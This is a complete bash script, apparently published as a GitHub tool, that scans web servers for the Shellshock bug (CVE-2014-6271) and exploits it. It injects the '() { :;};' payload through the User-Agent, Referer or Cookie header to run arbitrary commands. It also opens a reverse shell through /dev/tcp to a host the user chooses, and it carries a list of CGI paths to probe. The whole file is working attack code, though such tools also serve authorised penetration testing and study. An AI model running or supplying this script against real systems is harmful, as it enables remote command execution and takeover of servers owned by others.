#!/bin/bash

###############################################################################
# Bash Apocalypse - Shellshock (CVE-2014-6271) Exploitation Tool
# Author: Your Name
# Description: Automated scanner and exploiter for Shellshock vulnerability
# GitHub: https://github.com/YOUR-USERNAME/bash-apocalypse
###############################################################################

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Display banner
banner() {
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════════════════════════╗"
    echo "║  Bash Apocalypse - Shellshock Exploitation Tool          ║"
    echo "║  CVE-2014-6271 | Automated Scanner & Exploiter            ║"
    echo "╚════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Display usage information
usage() {
    echo -e "${YELLOW}Usage:${NC}"
    echo "  Scan mode:"
    echo "    $0 --scan --target <host> [--port <port>]"
    echo ""
    echo "  Exploit mode:"
    echo "    $0 --url <url> --cmd <command>"
    echo "    $0 --url <url> --reverse-shell <ip:port>"
    echo ""
    echo -e "${YELLOW}Options:${NC}"
    echo "  --scan              Scan target for vulnerable endpoints"
    echo "  --target            Target hostname or IP address"
    echo "  --port              Target port (default: 80)"
    echo "  --url               Direct URL to CGI script"
    echo "  --cmd               Command to execute on target"
    echo "  --reverse-shell     Get reverse shell (format: IP:PORT)"
    echo "  --header            Header to inject into (user-agent|referer|cookie)"
    echo "  --wordlist          Custom wordlist of CGI paths"
    echo "  -v, --verbose       Enable verbose output"
    echo "  -h, --help          Display this help message"
    echo ""
    echo -e "${YELLOW}Examples:${NC}"
    echo "  Scan for vulnerabilities:"
    echo "    $0 --scan --target localhost --port 8080"
    echo ""
    echo "  Execute command:"
    echo "    $0 --url http://localhost:8080/cgi-bin/test.cgi --cmd 'id'"
    echo ""
    echo "  Get reverse shell:"
    echo "    $0 --url http://localhost:8080/cgi-bin/test.cgi --reverse-shell 10.10.14.5:4444"
    echo ""
    exit 0
}

# Logging functions
log_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

log_error() {
    echo -e "${RED}[-]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_vulnerable() {
    echo -e "${RED}[VULNERABLE]${NC} $1"
}

# Default CGI paths to test
DEFAULT_PATHS=(
    "/cgi-bin/test.cgi"
    "/cgi-bin/admin.cgi"
    "/cgi-bin/status"
    "/cgi-bin/status.cgi"
    "/cgi-bin/test"
    "/cgi-bin/env.cgi"
    "/cgi-bin/printenv"
    "/cgi-bin/hello"
    "/cgi-bin/hello.cgi"
    "/cgi-sys/entropysearch.cgi"
    "/cgi-mod/index.cgi"
    "/cgi-bin/upload.cgi"
    "/cgi-bin/login.cgi"
)

# Generate Shellshock payload for command execution
generate_payload() {
    local cmd=$1
    # Payload format: () { :;}; echo; command
    echo "() { :;}; echo; /bin/bash -c '$cmd'"
}

# Test if a URL is vulnerable to Shellshock
test_vulnerability() {
    local url=$1
    local header=$2
    local verbose=$3
    
    # Generate unique marker to confirm vulnerability
    local marker="SHELLSHOCK_TEST_$$_$(date +%s)"
    local test_cmd="echo $marker"
    local payload=$(generate_payload "$test_cmd")
    
    if [ "$verbose" = true ]; then
        log_info "Testing: $url"
    fi
    
    # Send request with payload in specified header
    local response
    case $header in
        "referer")
            response=$(curl -s -m 10 -H "Referer: $payload" "$url" 2>&1)
            ;;
        "cookie")
            response=$(curl -s -m 10 -H "Cookie: session=$payload" "$url" 2>&1)
            ;;
        *)
            # Default: User-Agent header
            response=$(curl -s -m 10 -H "User-Agent: $payload" "$url" 2>&1)
            ;;
    esac
    
    # Check if our marker appears in the response
    if echo "$response" | grep -q "$marker"; then
        return 0  # Vulnerable
    else
        return 1  # Not vulnerable
    fi
}

# Execute arbitrary command on vulnerable target
execute_command() {
    local url=$1
    local cmd=$2
    local header=$3
    
    log_info "Executing command: $cmd"
    
    # Generate payload
    local payload=$(generate_payload "$cmd")
    
    # Send exploit request
    local response
    case $header in
        "referer")
            response=$(curl -s -m 10 -H "Referer: $payload" "$url" 2>&1)
            ;;
        "cookie")
            response=$(curl -s -m 10 -H "Cookie: session=$payload" "$url" 2>&1)
            ;;
        *)
            response=$(curl -s -m 10 -H "User-Agent: $payload" "$url" 2>&1)
            ;;
    esac
    
    # Check if command executed successfully
    if [ $? -eq 0 ]; then
        log_success "Command executed successfully"
        echo ""
        echo -e "${GREEN}Output:${NC}"
        echo "$response"
        return 0
    else
        log_error "Command execution failed"
        return 1
    fi
}

# Setup reverse shell connection
reverse_shell() {
    local url=$1
    local target=$2
    local header=$3
    
    # Parse IP and PORT from target
    IFS=':' read -r lhost lport <<< "$target"
    
    # Validate input
    if [ -z "$lhost" ] || [ -z "$lport" ]; then
        log_error "Invalid reverse shell format. Use IP:PORT"
        exit 1
    fi
    
    log_info "Setting up reverse shell to $lhost:$lport"
    log_warning "Ensure you have a listener running on the target:"
    echo -e "  ${CYAN}nc -lvnp $lport${NC}"
    echo ""
    read -p "Press Enter when listener is ready..."
    
    # Reverse shell payload
    local shell_cmd="bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    
    log_info "Sending reverse shell payload..."
    execute_command "$url" "$shell_cmd" "$header"
    
    log_success "Reverse shell payload sent"
    log_info "Check your listener for incoming connection"
}

# Scan target for vulnerable endpoints
scan_target() {
    local target=$1
    local port=$2
    local wordlist=$3
    local verbose=$4
    
    log_info "Starting scan of $target:$port"
    echo ""
    
    # Determine which paths to test
    local paths=()
    if [ -f "$wordlist" ]; then
        log_info "Loading paths from wordlist: $wordlist"
        while IFS= read -r line; do
            # Skip empty lines and comments
            [[ -z "$line" || "$line" =~ ^# ]] && continue
            paths+=("$line")
        done < "$wordlist"
    else
        log_info "Using default path list (${#DEFAULT_PATHS[@]} paths)"
        paths=("${DEFAULT_PATHS[@]}")
    fi
    
    log_info "Testing ${#paths[@]} endpoints..."
    echo ""
    
    # Counters for statistics
    local vulnerable_count=0
    local tested_count=0
    local vulnerable_endpoints=()
    
    # Test each path
    for path in "${paths[@]}"; do
        ((tested_count++))
        local url="http://${target}:${port}${path}"
        
        if test_vulnerability "$url" "user-agent" "$verbose"; then
            log_vulnerable "$url"
            vulnerable_endpoints+=("$url")
            ((vulnerable_count++))
        elif [ "$verbose" = true ]; then
            echo -e "${NC}[-] Not vulnerable: $url${NC}"
        fi
    done
    
    # Display scan summary
    echo ""
    echo -e "${BLUE}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                    Scan Summary                           ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════════╝${NC}"
    echo -e "  Target:           $target:$port"
    echo -e "  Endpoints tested: $tested_count"
    echo -e "  Vulnerable:       ${RED}$vulnerable_count${NC}"
    echo ""
    
    # Show vulnerable endpoints
    if [ $vulnerable_count -gt 0 ]; then
        log_vulnerable "Found $vulnerable_count vulnerable endpoint(s)!"
        echo ""
        log_info "Next steps:"
        echo "  1. Verify findings manually with Burp Suite"
        echo "  2. Use --url option to exploit:"
        for endpoint in "${vulnerable_endpoints[@]}"; do
            echo "     $0 --url $endpoint --cmd 'id'"
        done
        return 0
    else
        log_success "No vulnerabilities detected on this target"
        log_info "Try different ports or targets"
        return 1
    fi
}

# Main function
main() {
    banner
    
    # Check if no arguments provided
    if [ $# -eq 0 ]; then
        usage
    fi
    
    # Initialize variables
    local mode=""
    local target=""
    local port=80
    local url=""
    local cmd=""
    local reverse_shell_target=""
    local header="user-agent"
    local wordlist=""
    local verbose=false
    
    # Parse command line arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            --scan)
                mode="scan"
                shift
                ;;
            --target)
                target="$2"
                shift 2
                ;;
            --port)
                port="$2"
                shift 2
                ;;
            --url)
                url="$2"
                mode="exploit"
                shift 2
                ;;
            --cmd)
                cmd="$2"
                shift 2
                ;;
            --reverse-shell)
                reverse_shell_target="$2"
                shift 2
                ;;
            --header)
                header="$2"
                shift 2
                ;;
            --wordlist)
                wordlist="$2"
                shift 2
                ;;
            -v|--verbose)
                verbose=true
                shift
                ;;
            -h|--help)
                usage
                ;;
            *)
                log_error "Unknown option: $1"
                echo ""
                usage
                ;;
        esac
    done
    
    # Validate mode
    if [ -z "$mode" ]; then
        log_error "Must specify either --scan or --url"
        echo ""
        usage
    fi
    
    # Execute based on mode
    case $mode in
        "scan")
            if [ -z "$target" ]; then
                log_error "Target is required for scan mode (use --target)"
                exit 1
            fi
            scan_target "$target" "$port" "$wordlist" "$verbose"
            ;;
        "exploit")
            if [ -z "$url" ]; then
                log_error "URL is required for exploit mode (use --url)"
                exit 1
            fi
            
            if [ ! -z "$cmd" ]; then
                execute_command "$url" "$cmd" "$header"
            elif [ ! -z "$reverse_shell_target" ]; then
                reverse_shell "$url" "$reverse_shell_target" "$header"
            else
                log_error "Must specify either --cmd or --reverse-shell"
                echo ""
                usage
            fi
            ;;
        *)
            log_error "Invalid mode"
            usage
            ;;
    esac
}

# Execute main function with all arguments
main "$@"